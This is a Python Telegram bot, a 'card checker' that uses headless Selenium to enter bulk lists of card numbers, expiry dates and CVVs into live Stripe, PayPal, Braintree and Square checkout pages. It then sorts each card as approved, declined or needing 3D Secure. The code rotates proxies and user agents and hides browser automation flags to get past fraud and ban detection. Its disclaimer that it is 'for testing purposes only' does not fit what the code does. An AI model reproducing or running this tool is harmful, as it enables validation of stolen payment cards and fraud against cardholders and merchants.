#!/usr/bin/env python3
"""
Professional Card Checker Bot
- Multi-gateway support (Stripe, PayPal, Braintree, Square, etc.)
- Proxy rotation (HTTP/HTTPS/SOCKS5)
- Accurate response detection
- Anti-ban protection
"""

import os
import time
import random
import logging
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot Token
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

# User agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

class CardChecker:
    def __init__(self, proxy=None):
        self.proxy = proxy
        self.driver = None
        self.wait = None
        
    def setup_driver(self):
        """Setup Chrome with proxy and anti-detection"""
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Random user agent
        user_agent = random.choice(USER_AGENTS)
        chrome_options.add_argument(f'user-agent={user_agent}')
        
        # Proxy setup
        if self.proxy:
            chrome_options.add_argument(f'--proxy-server={self.proxy}')
            logger.info(f"🔄 Using proxy: {self.proxy}")
        
        self.driver = webdriver.Chrome(options=chrome_options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        self.wait = WebDriverWait(self.driver, 20)
        
    def close(self):
        """Close browser"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
    
    def detect_gateway(self, url):
        """Detect payment gateway from URL or page content"""
        url_lower = url.lower()
        
        if 'stripe.com' in url_lower or 'checkout.stripe' in url_lower:
            return 'Stripe'
        elif 'paypal.com' in url_lower:
            return 'PayPal'
        elif 'braintree' in url_lower:
            return 'Braintree'
        elif 'square' in url_lower or 'squareup' in url_lower:
            return 'Square'
        elif 'authorize.net' in url_lower:
            return 'Authorize.Net'
        
        # Check page content
        try:
            page_source = self.driver.page_source.lower()
            if 'stripe' in page_source:
                return 'Stripe'
            elif 'paypal' in page_source:
                return 'PayPal'
            elif 'braintree' in page_source:
                return 'Braintree'
            elif 'square' in page_source:
                return 'Square'
        except:
            pass
        
        return 'Unknown'
    
    def fill_stripe_checkout(self, card_number, exp_month, exp_year, cvv, name="John Doe"):
        """Fill Stripe hosted checkout page"""
        try:
            # Wait for Stripe iframe to load
            time.sleep(3)
            
            # Switch to Stripe iframe
            iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
            
            for iframe in iframes:
                try:
                    self.driver.switch_to.frame(iframe)
                    
                    # Try to find card number field in this iframe
                    try:
                        # Stripe uses specific field names
                        card_field = self.driver.find_element(By.NAME, 'cardnumber')
                        
                        # Fill card number
                        card_field.send_keys(card_number)
                        logger.info("✅ Filled card number (Stripe)")
                        time.sleep(1)
                        
                        # Fill expiry (Stripe format: MM/YY)
                        exp_field = self.driver.find_element(By.NAME, 'exp-date')
                        exp_field.send_keys(f"{exp_month}{exp_year[-2:]}")
                        logger.info("✅ Filled expiry (Stripe)")
                        time.sleep(1)
                        
                        # Fill CVC
                        cvc_field = self.driver.find_element(By.NAME, 'cvc')
                        cvc_field.send_keys(cvv)
                        logger.info("✅ Filled CVC (Stripe)")
                        time.sleep(1)
                        
                        # Fill name (if exists)
                        try:
                            name_field = self.driver.find_element(By.NAME, 'name')
                            name_field.send_keys(name)
                            logger.info("✅ Filled name (Stripe)")
                        except:
                            pass
                        
                        # Switch back
                        self.driver.switch_to.default_content()
                        return True
                        
                    except:
                        self.driver.switch_to.default_content()
                        continue
                        
                except:
                    self.driver.switch_to.default_content()
                    continue
            
            # If iframe method failed, try direct selectors
            return self.fill_card_details_generic(card_number, exp_month, exp_year, cvv, name)
            
        except Exception as e:
            logger.error(f"❌ Error filling Stripe checkout: {e}")
            return False
    
    def fill_card_details_generic(self, card_number, exp_month, exp_year, cvv, name="John Doe"):
        """Fill card details - generic method for multiple gateways"""
        try:
            # Card number selectors
            card_selectors = [
                'input[name="cardnumber"]',
                'input[name="card_number"]',
                'input[placeholder*="card number" i]',
                'input[autocomplete="cc-number"]',
                'input[id*="card" i][id*="number" i]',
                '#card-number',
                '#cardNumber',
                '.card-number',
                'input[type="tel"][maxlength="19"]',
            ]
            
            card_filled = False
            for selector in card_selectors:
                try:
                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if elem.is_displayed():
                        elem.clear()
                        elem.send_keys(card_number)
                        logger.info(f"✅ Filled card number")
                        card_filled = True
                        time.sleep(0.5)
                        break
                except:
                    continue
            
            if not card_filled:
                # Try iframe (Stripe, Square)
                try:
                    iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
                    for iframe in iframes:
                        try:
                            self.driver.switch_to.frame(iframe)
                            for selector in card_selectors:
                                try:
                                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                                    elem.send_keys(card_number)
                                    logger.info(f"✅ Filled card number (iframe)")
                                    card_filled = True
                                    break
                                except:
                                    continue
                            self.driver.switch_to.default_content()
                            if card_filled:
                                break
                        except:
                            self.driver.switch_to.default_content()
                            continue
                except:
                    pass
            
            # Expiry date
            exp_selectors = [
                'input[name="exp-date"]',
                'input[name="expiry"]',
                'input[placeholder*="expiry" i]',
                'input[placeholder*="MM/YY" i]',
                'input[autocomplete="cc-exp"]',
            ]
            
            exp_filled = False
            for selector in exp_selectors:
                try:
                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if elem.is_displayed():
                        elem.clear()
                        elem.send_keys(f"{exp_month}/{exp_year[-2:]}")
                        logger.info(f"✅ Filled expiry")
                        exp_filled = True
                        time.sleep(0.5)
                        break
                except:
                    continue
            
            # Separate month/year fields
            if not exp_filled:
                try:
                    month_elem = self.driver.find_element(By.CSS_SELECTOR, 'input[name*="month" i], select[name*="month" i]')
                    year_elem = self.driver.find_element(By.CSS_SELECTOR, 'input[name*="year" i], select[name*="year" i]')
                    
                    if month_elem.tag_name == 'select':
                        Select(month_elem).select_by_value(exp_month)
                    else:
                        month_elem.send_keys(exp_month)
                    
                    if year_elem.tag_name == 'select':
                        Select(year_elem).select_by_value(exp_year)
                    else:
                        year_elem.send_keys(exp_year[-2:])
                    
                    logger.info(f"✅ Filled expiry (separate)")
                    time.sleep(0.5)
                except:
                    pass
            
            # CVV/CVC
            cvv_selectors = [
                'input[name="cvc"]',
                'input[name="cvv"]',
                'input[name="security_code"]',
                'input[placeholder*="cvv" i]',
                'input[placeholder*="cvc" i]',
                'input[autocomplete="cc-csc"]',
            ]
            
            for selector in cvv_selectors:
                try:
                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if elem.is_displayed():
                        elem.clear()
                        elem.send_keys(cvv)
                        logger.info(f"✅ Filled CVV")
                        time.sleep(0.5)
                        break
                except:
                    continue
            
            # Cardholder name
            name_selectors = [
                'input[name="name"]',
                'input[name="cardholder"]',
                'input[name="card_name"]',
                'input[placeholder*="name on card" i]',
                'input[autocomplete="cc-name"]',
            ]
            
            for selector in name_selectors:
                try:
                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if elem.is_displayed():
                        elem.clear()
                        elem.send_keys(name)
                        logger.info(f"✅ Filled name")
                        time.sleep(0.5)
                        break
                except:
                    continue
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Error filling card: {e}")
            return False
    
    def submit_payment(self):
        """Click submit/pay button"""
        submit_selectors = [
            'button[type="submit"]',
            'button:contains("Pay")',
            'button:contains("Submit")',
            'button:contains("Complete")',
            'input[type="submit"]',
            '.submit-button',
            '#submit-button',
            'button.pay-button',
        ]
        
        for selector in submit_selectors:
            try:
                if ':contains' in selector:
                    # XPath for text search
                    text = selector.split('"')[1]
                    elem = self.driver.find_element(By.XPATH, f"//button[contains(text(), '{text}')]")
                else:
                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                
                if elem.is_displayed():
                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", elem)
                    time.sleep(1)
                    elem.click()
                    logger.info(f"✅ Clicked submit button")
                    return True
            except:
                continue
        
        return False
    
    def detect_response(self):
        """Detect payment response with high accuracy"""
        time.sleep(5)  # Wait for response
        
        try:
            page_source = self.driver.page_source.lower()
            current_url = self.driver.current_url.lower()
            
            # Success indicators
            success_keywords = [
                'success', 'approved', 'confirmed', 'complete', 'thank you',
                'payment successful', 'order confirmed', 'receipt',
                'transaction approved', 'payment received'
            ]
            
            # Decline indicators
            decline_keywords = [
                'declined', 'failed', 'rejected', 'invalid', 'error',
                'insufficient funds', 'card declined', 'payment failed',
                'transaction declined', 'not authorized', 'do not honor'
            ]
            
            # 3D Secure / OTP indicators
            auth_keywords = [
                '3d secure', '3ds', 'authentication', 'verify', 'otp',
                'security code', 'sms code', 'verification required'
            ]
            
            # Check for success
            for keyword in success_keywords:
                if keyword in page_source or keyword in current_url:
                    return {
                        'status': 'Approved ✅',
                        'message': 'Payment successful',
                        'code': 'SUCCESS'
                    }
            
            # Check for 3DS/Auth
            for keyword in auth_keywords:
                if keyword in page_source:
                    return {
                        'status': 'Auth Required 🔐',
                        'message': '3D Secure / OTP required',
                        'code': 'AUTH_REQUIRED'
                    }
            
            # Check for decline
            for keyword in decline_keywords:
                if keyword in page_source:
                    # Try to extract specific error
                    error_msg = self.extract_error_message(page_source)
                    return {
                        'status': 'Declined ❌',
                        'message': error_msg or 'Card declined',
                        'code': 'DECLINED'
                    }
            
            # Check for specific error messages
            if 'insufficient' in page_source:
                return {
                    'status': 'Declined ❌',
                    'message': 'Insufficient funds',
                    'code': 'INSUFFICIENT_FUNDS'
                }
            
            if 'expired' in page_source:
                return {
                    'status': 'Declined ❌',
                    'message': 'Card expired',
                    'code': 'EXPIRED_CARD'
                }
            
            if 'invalid card' in page_source or 'invalid number' in page_source:
                return {
                    'status': 'Declined ❌',
                    'message': 'Invalid card number',
                    'code': 'INVALID_CARD'
                }
            
            # Unknown response
            return {
                'status': 'Unknown ⚠️',
                'message': 'Could not determine response',
                'code': 'UNKNOWN'
            }
            
        except Exception as e:
            logger.error(f"Error detecting response: {e}")
            return {
                'status': 'Error ⚠️',
                'message': str(e),
                'code': 'ERROR'
            }
    
    def is_url_expired(self):
        """Check if checkout URL is expired or invalid"""
        try:
            page_source = self.driver.page_source.lower()
            current_url = self.driver.current_url.lower()
            
            # Expiration indicators
            expired_keywords = [
                'expired', 'session expired', 'link expired',
                'invalid session', 'session timeout', 'not found',
                '404', 'page not found', 'cart is empty',
                'no items in cart', 'checkout unavailable'
            ]
            
            for keyword in expired_keywords:
                if keyword in page_source or keyword in current_url:
                    logger.warning(f"⏰ URL expired: {keyword}")
                    return True
            
            # Check if redirected to home/cart
            if any(x in current_url for x in ['cart', 'home', 'index']):
                if 'checkout' not in current_url:
                    logger.warning(f"⏰ Redirected away from checkout")
                    return True
            
            return False
            
        except:
            return False
    
    def extract_error_message(self, page_source):
        """Extract specific error message from page"""
        try:
            # Common error message patterns
            error_patterns = [
                'declined', 'insufficient', 'expired', 'invalid',
                'do not honor', 'lost card', 'stolen card',
                'restricted card', 'security violation'
            ]
            
            for pattern in error_patterns:
                if pattern in page_source:
                    # Try to extract surrounding text
                    start = page_source.find(pattern)
                    snippet = page_source[max(0, start-50):start+100]
                    return snippet.strip()
            
            return None
        except:
            return None
    
    def is_stripe_checkout(self, url):
        """Check if URL is Stripe hosted checkout"""
        return 'checkout.stripe.com' in url.lower()
    
    def check_card(self, url, card_number, exp_month, exp_year, cvv, name="John Doe"):
        """Main card checking function"""
        try:
            self.setup_driver()
            
            # Navigate to checkout
            logger.info(f"🌐 Opening: {url}")
            self.driver.get(url)
            time.sleep(3)
            
            # Check if URL is expired/invalid
            if self.is_url_expired():
                return {
                    'status': 'URL Expired ⏰',
                    'message': 'Checkout URL expired or invalid',
                    'code': 'URL_EXPIRED',
                    'gateway': 'N/A'
                }
            
            # Detect gateway
            gateway = self.detect_gateway(url)
            logger.info(f"💳 Gateway: {gateway}")
            
            # Check if Stripe hosted checkout
            is_stripe = self.is_stripe_checkout(url)
            
            # Fill card details
            if is_stripe:
                fill_success = self.fill_stripe_checkout(card_number, exp_month, exp_year, cvv, name)
            else:
                fill_success = self.fill_card_details_generic(card_number, exp_month, exp_year, cvv, name)
            
            if not fill_success:
                return {
                    'status': 'Error ⚠️',
                    'message': 'Could not fill card details',
                    'code': 'FILL_ERROR',
                    'gateway': gateway
                }
            
            # Submit payment
            if not self.submit_payment():
                return {
                    'status': 'Error ⚠️',
                    'message': 'Could not submit payment',
                    'code': 'SUBMIT_ERROR',
                    'gateway': gateway
                }
            
            # Detect response
            response = self.detect_response()
            response['gateway'] = gateway
            
            return response
            
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            return {
                'status': 'Error ⚠️',
                'message': str(e),
                'code': 'EXCEPTION',
                'gateway': 'Unknown'
            }
        finally:
            self.close()


# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    welcome_msg = """
🤖 **Professional Card Checker Bot**

**Commands:**
/start - Show this message
/check - Start card checking

**How to use:**
1. Send /check
2. Send checkout URL
3. Upload cards.txt file
4. Upload proxies.txt file (optional)
5. Wait for results

**File formats:**
cards.txt: `4242424242424242|12|2025|123|John Doe`
proxies.txt: `http://user:pass@proxy.com:8080`

⚠️ **For testing purposes only!**
"""
    await update.message.reply_text(welcome_msg)


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check command"""
    context.user_data['state'] = 'waiting_url'
    await update.message.reply_text("📝 Send me the checkout URL:")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle messages"""
    state = context.user_data.get('state')
    
    if state == 'waiting_url':
        url = update.message.text
        if not url.startswith('http'):
            await update.message.reply_text("❌ Invalid URL. Please send a valid checkout URL.")
            return
        
        context.user_data['url'] = url
        context.user_data['state'] = 'waiting_cards'
        await update.message.reply_text("✅ URL saved!\n\n📄 Now send cards.txt file:")
    
    else:
        await update.message.reply_text("❌ Unknown command. Use /start to see available commands.")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    state = context.user_data.get('state')
    
    if state == 'waiting_cards':
        # Download cards file
        file = await update.message.document.get_file()
        cards_path = f'/tmp/cards_{update.effective_user.id}.txt'
        await file.download_to_drive(cards_path)
        
        context.user_data['cards_file'] = cards_path
        context.user_data['state'] = 'waiting_proxies'
        
        await update.message.reply_text("✅ Cards file saved!\n\n🔄 Now send proxies.txt file (or send /skip to continue without proxies):")
    
    elif state == 'waiting_proxies':
        # Download proxies file
        file = await update.message.document.get_file()
        proxies_path = f'/tmp/proxies_{update.effective_user.id}.txt'
        await file.download_to_drive(proxies_path)
        
        context.user_data['proxies_file'] = proxies_path
        
        # Start checking
        await start_checking(update, context)


async def skip_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Skip proxies"""
    if context.user_data.get('state') == 'waiting_proxies':
        context.user_data['proxies_file'] = None
        await start_checking(update, context)


async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start card checking process"""
    url = context.user_data.get('url')
    cards_file = context.user_data.get('cards_file')
    proxies_file = context.user_data.get('proxies_file')
    
    # Read cards
    with open(cards_file, 'r') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    # Read proxies
    proxies = []
    if proxies_file:
        with open(proxies_file, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    
    await update.message.reply_text(f"🚀 Starting check...\n\n📊 Cards: {len(cards)}\n🔄 Proxies: {len(proxies) if proxies else 0}\n\n⏳ Please wait...")
    
    # Check cards
    results = []
    url_expired = False
    for i, card_line in enumerate(cards, 1):
        try:
            parts = card_line.split('|')
            if len(parts) < 4:
                continue
            
            card_number = parts[0].strip()
            exp_month = parts[1].strip()
            exp_year = parts[2].strip()
            cvv = parts[3].strip()
            name = parts[4].strip() if len(parts) > 4 else "John Doe"
            
            # Select proxy
            proxy = None
            if proxies:
                proxy = proxies[(i-1) % len(proxies)]
            
            # Check card
            checker = CardChecker(proxy=proxy)
            result = checker.check_card(url, card_number, exp_month, exp_year, cvv, name)
            
            # Check if URL expired
            if result['code'] == 'URL_EXPIRED':
                url_expired = True
                await update.message.reply_text(
                    "⏰ **Checkout URL Expired!**\n\n"
                    "🔴 The checkout link is no longer valid.\n"
                    "This can happen when:\n"
                    "  • Session timeout\n"
                    "  • Cart cleared\n"
                    "  • Link expired\n\n"
                    "🔄 **Please provide a new checkout URL**\n\n"
                    "Send /check to start with a new URL."
                )
                break
            
            # Format result
            masked_card = f"{card_number[:4]}...{card_number[-4:]}"
            result_msg = f"{i}/{len(cards)} - {result['status']}\n"
            result_msg += f"💳 {masked_card} | {exp_month}/{exp_year} | {cvv}\n"
            result_msg += f"🏦 Gateway: {result['gateway']}\n"
            result_msg += f"📝 {result['message']}\n"
            
            if proxy:
                result_msg += f"🔄 Proxy: {proxy.split('@')[1] if '@' in proxy else proxy}\n"
            
            results.append(result_msg)
            
            # Send progress
            await update.message.reply_text(result_msg)
            
            # Random delay
            time.sleep(random.uniform(3, 8))
            
        except Exception as e:
            logger.error(f"Error checking card {i}: {e}")
            continue
    
    # Send summary (only if not expired)
    if not url_expired:
        summary = f"\n\n✅ **Check Complete!**\n\n"
        summary += f"📊 Total: {len(cards)}\n"
        summary += f"✅ Approved: {sum(1 for r in results if 'Approved' in r)}\n"
        summary += f"❌ Declined: {sum(1 for r in results if 'Declined' in r)}\n"
        summary += f"🔐 Auth Required: {sum(1 for r in results if 'Auth Required' in r)}\n"
        
        await update.message.reply_text(summary)
    
    # Reset state
    context.user_data.clear()


def main():
    """Start bot"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("skip", skip_proxies))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logger.info("🤖 Bot started!")
    app.run_polling()


if __name__ == '__main__':
    main()
